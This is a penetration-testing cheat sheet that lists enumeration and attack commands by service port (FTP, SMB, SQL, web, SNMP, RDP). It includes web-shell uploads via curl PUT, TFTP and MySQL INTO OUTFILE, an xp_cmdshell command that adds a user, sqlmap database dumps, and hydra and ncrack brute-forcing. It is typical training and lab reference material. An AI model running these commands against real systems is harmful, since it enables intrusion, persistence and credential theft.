# Enum

## Table of Content

---

- [Enum](#enum)
  - [Table of Content](#table-of-content)
  - [Scanning](#scanning)
  - [FTP(21)](#ftp21)
  - [TFTP](#tftp)
  - [SSH(22)](#ssh22)
  - [SMTP(25)](#smtp25)
  - [DNS(53)](#dns53)
    - [Linux](#linux)
    - [Windows](#windows)
  - [RPC(135)](#rpc135)
  - [Netbios(137)](#netbios137)
  - [SMB(139,445)](#smb139445)
  - [LDAP(389)](#ldap389)
  - [Web(80,443)](#web80443)
  - [SNMP(161,162)](#snmp161162)
    - [SNMP MIB Trees](#snmp-mib-trees)
  - [MsSQL(1433)](#mssql1433)
  - [Wordpress](#wordpress)
  - [NFS(2049)](#nfs2049)
  - [mySQL(3306)](#mysql3306)
  - [Remote Desktop Service(3389)](#remote-desktop-service3389)
  - [Random port](#random-port)
  - [Brute Forcing](#brute-forcing)
  - [Password List](#password-list)

## Scanning

---

```bash
nmap -sC -sV -oN nmap/nmap $IP
```

- **sC** : Run default scripts
- **sV** : Determine service version info
- **oN** : Output in Normal

---
**NOTE**

Other useful flags:

**-Pn** : No Ping

**-p-** : Scan all ports

**-F** : Fast scan(100 ports only)

**-sn** : Disable port scan(Used when scanning for active hosts)

**-n** : No dns resolution

`Automated script`

```bash
#!/bin/bash
nmap $1 -F -oN $2/nmap/quick_nmap                 # first, quick scan
nmap -sV -A -O -T4 -sC $1 -oN $2/nmap/nmap  # verify services, Os, run scripts
nmap -p 1-65535 -T5 -sT $1 -oN $2/nmap/all_port_nmap # scan all ports TCP
nmap -p 1-10000 -T4 -Su $1 -oN $2/nmap/udp_nmap # UDP scan
```

`Full vulnerability scanning`

```bash

mkdir /usr/share/nmap/scripts/vulnscan; cd /usr/share/nmap/scripts/vulnscan; git clone https://github.com/scipag/vulscan.git; nmap -sS -sV --script=/usr/share/nmap/scripts/vulnscan/vulscan.nse $ip
```

---

## FTP(21)

---
Try to connect to the service using `anonymous` user

```bash
ftp $IP
username: anonymous
password: anonymous
```

To download files

```bash
mget file-name
```

```bash
nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn $IP
```

Metasploit Modules for FTP service;

- auxiliary/scanner/ftp/anonymous
- auxiliary/scanner/ftp/ftp_login
- auxiliary/scanner/ftp/ftp_version
- auxiliary/scanner/ftp/konica_ftp_traversal

## TFTP

---

```bash
$ tftp $ip
tftp> ls
?Invalid command
tftp> verbose
Verbose mode on.
tftp> put shell.php
Sent 3605 bytes in 0.0 seconds [inf bits/sec]
```

## SSH(22)

---
```bash
ssh $IP
```

```bash
nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root $IP

nmap -p 22 -n -v -sV -Pn --script ssh-hostkey $IP 

nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt $IP

```
Metasploit Modules for SSH service

- auxiliary/scanner/ssh/fortinet_backdoor
- auxiliary/scanner/ssh/juniper_backdoor
- auxiliary/scanner/ssh/ssh_enumusers
- auxiliary/scanner/ssh/ssh_identify_pubkeys
- auxiliary/scanner/ssh/ssh_login
- auxiliary/scanner/ssh/ssh_login_pubkey
- auxiliary/scanner/ssh/ssh_version

## SMTP(25)

---

```bash
nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn $IP
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
```

`Command to check if a user exists`
> VRFY root

`Command to ask the server if a user belongs to a mailing list`
> EXPN root

Metasploit Modules for SMTP service;

- auxiliary/scanner/smtp/smtp_enum
- auxiliary/scanner/smtp/smtp_ntlm_domain
- auxiliary/scanner/smtp/smtp_relay
- auxiliary/scanner/smtp/smtp_version 

## DNS(53)

---

### Linux

Zone transfer request

```bash
dnsrecon -d $IP -t axfr
```

```bash
host -l test.com ns1.test.com
```

Find nameservers for a given domain

```bash
dnsenum test.com
```

```bash
host -t ns test.com | cut -d " " -f 4 #
```

```bash
dig axfs test.com @ns1.test.com
```

Find server names

```bash
host -t ns test.com
```

Find email servers

```bash
host -t mx test.com
```

Reverse dns lookup bruteforceing

```bash
for ip in $(seq 155 190); do host 192.168.67.$ip;done | grep -v "not found"
```

### Windows

```bash
nslookup -> set type=any -> ls -d test.com
```

```bash
dnsrecon -d $IP -d /usr/share/wprdlists/dnsmap.txt -t std
```

## RPC(135)

---

```bash
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum $IP
```

Metasploit Exploit Module for Microsoft RPC service;

- exploit/windows/dcerpc/ms05_017_msmq

## Netbios(137)

---
`Dumping the netbios table`

```bash
nmap -Pn -sU -sC -p137 $ip
```

---

## SMB(139,445)

---

```bash
enum4Linux -a $IP
```

```bash
nbtscan $IP
```

```bash
nmblookup -A $IP
```

`Null session and extract information`

```bash
nbtscan -r $ip
```

```bash
nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln* $IP

smbclient -L \\\\\\\\$IP

smbclient \\\\\\\\$IP\\\\share

smbclient \\\\\\\\$IP\\\\share -U uaername%password

smbclient \\\\\\\\$IP\\\\share -U username

rpcclient -U "" $IP
```

- > srvinfo
- > enumdomusers
- > getdompwinfo //password policy
- > querydominfo
- > netshareenum

Metasploit Modules for Microsoft SMB service;

- auxiliary/scanner/smb/psexec_loggedin_users
- auxiliary/scanner/smb/smb_enumshares
- auxiliary/scanner/smb/smb_enumusers
- auxiliary/scanner/smb/smb_enumusers_domain
- auxiliary/scanner/smb/smb_login
- auxiliary/scanner/smb/smb_lookupsid
- auxiliary/scanner/smb/smb_ms17_010
- auxiliary/scanner/smb/smb_version

Use `get` to download file
> get file-name

`Bruteforce`

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 $ip smb
```

Any metasploit exploit through Netbios over TCP in 139, you need to set:
> set SMBDirect false

## LDAP(389)

---

```bash
ldapsearch -h $IP -p $PORT -x -s base
```

- **-x**: simple Auth
- **-s**: scope (base, one, sub)

```bash
ldapsearch -LLL -x -H ldap://\<FQDN\> -b '' -s base '(objectclass=*)'
```

## Web(80,443)

---

```bash
dirb http://$IP wordlist -o dirb/dirb
dirb http://$IP wordlist -o dirb/dirb -X .html,.js
```

**NOTE**

Extenstions to check: .txt, .php, .html
Use blank ("") if you want to check for folder

```bash
nikto -host $IP:port
```

```bash
curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://$IP/shell.php
```

```bash
sqlmap -u http://$IP/ --crawl=5 --dbms=mysql
```

Get all databases

```bash
sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" --dbs --dump
```

Get all tables

```bash
sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" -D users --tables --dump
```

Get all content of a table

```bash
sqlmap -u 10.10.42.154/administrator.php --data "username=&password=" -D users -T users --dump
```

Use burp request

```bash
sqlmap -r request.txt -p email,password
```

URL params

```bash
sqlmap -u "http://$ip/?query" --data="user=foo&pass=bar&submit=Login" --level=5 --risk=3 --dbms=mysql
```

Create a wordlist from the provided url

```bash
cewl http://$IP/ -m 6 -w special_wordlist.txt
```

Brute-force login page

```bash
medusa -h $IP -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
```

```bash
nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* $IP
```

`HTTPs service enumeration`

```bash
sslscan https://$IP/
```

`Basic SSL ciphers check`

```bash
nmap --script ssl-enum-ciphers -p 443 $ip
```

- Look for unsafe ciphers such as Triple-DES and Blowfish
- Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed

`Banner grabbing`

```bash
./whatweb $ip # identifies all known services
```

## SNMP(161,162)

---

```bash
nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat $IP
```

```bash
onesixtyone -c communities.txt $IP
```

```bash
snmp-check -t $IP -c public
```

```bash
snmpwalk -c public -v 1 $IP [MIB_TREE_VALUE]
```

```bash
hydra -P passwords.txt -v $IP snmp
```

`Communities.txt`
public
private
community

### SNMP MIB Trees

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports

Metasploit Modules for SNMP service;

- auxiliary/scanner/snmp/snmp_enum
- auxiliary/scanner/snmp/snmp_enum_hp_laserjet
- auxiliary/scanner/snmp/snmp_enumshares
- auxiliary/scanner/snmp/snmp_enumusers
- auxiliary/scanner/snmp/snmp_login

## MsSQL(1433)

---

```bash
nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $IP
nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  $IP
nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" $IP
```

```bash
sqsh -S $IP -U sa
```

Metasploit Modules for MsSQL service;

- auxiliary/scanner/mssql/mssql_login
- auxiliary/admin/mssql/mssql_exec
- auxiliary/admin/mssql/mssql_enum

## Wordpress

---

```bash
wpscan --url url --enumarate u,ap --disable-tls-check --log dir
```

`User bruteforce`

```bash
wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir
```

**u**: For users
**ap**: For plugins

## NFS(2049)

---

```bash
nmap --script=nfs-ls $IP
```

```bash
rpcinfo -p $IP
```

```bash
showmount -e $IP
```

```bash
showmount -a $IP
```

```bash
mount -t nfs $IP:/sharedfolder /mnt/temp
```

## mySQL(3306)

---

```bash
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 $IP
```

```bash
mysql  -h $IP -u user -p --execute="show databases"
```

Upload a shell

```bash
mysql  -h $IP -u user -p
```

```mysql
mysql> SELECT "<?php system($_GET['cmd']);?>" into outfile "file-path"
```

`OR`

```mysql
myysql> \! /bin/bash
```

```mysql
mysql> select do_system('id');
```

```mysql
mysql> \! sh
```

```file-path example: /var/www/https/blog/wp-content/uploads/backdoor.php```

Metasploit Modules for MySQL service;

- auxiliary/scanner/mysql/mysql_authbypass_hashdump
- auxiliary/scanner/mysql/mysql_login
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_writable_dirs

## Remote Desktop Service(3389)

---

```bash
ncrack -vv --user administrator -P passwords.txt rdp://$IP,CL=1
```

```bash
rdesktop $IP
rdesktop -u guest -p guest $IP
```

Metasploit Modules for Remote Desktop service;

- auxiliary/scanner/rdp/ms12_020_check
- auxiliary/scanner/rdp/rdp_scanner 


## Random port

---

```bash
netcat $IP $port
```


## Brute Forcing

---

```bash
hydra -L username-file -P password-file -e nsr service://$IP
hydra -L username-file -P password-file -e nsr ftp://$IP
hydra -L username-file -P password-file -e nsr $IP ssh
```

- **-e** : extra checks
- **n** : null as password
- **s** : same as password(username)
- **r** : reverse as password(username)

```bash
ncrack service_name://$IP:$PORT
```

Wordpress user bruteforce

```bash
wpscan --url url --disable-tls-check --usernames user-file --wordlist password-file --log dir
```

## Password List

---

- darkc0de.txt
- Rockyou.txt
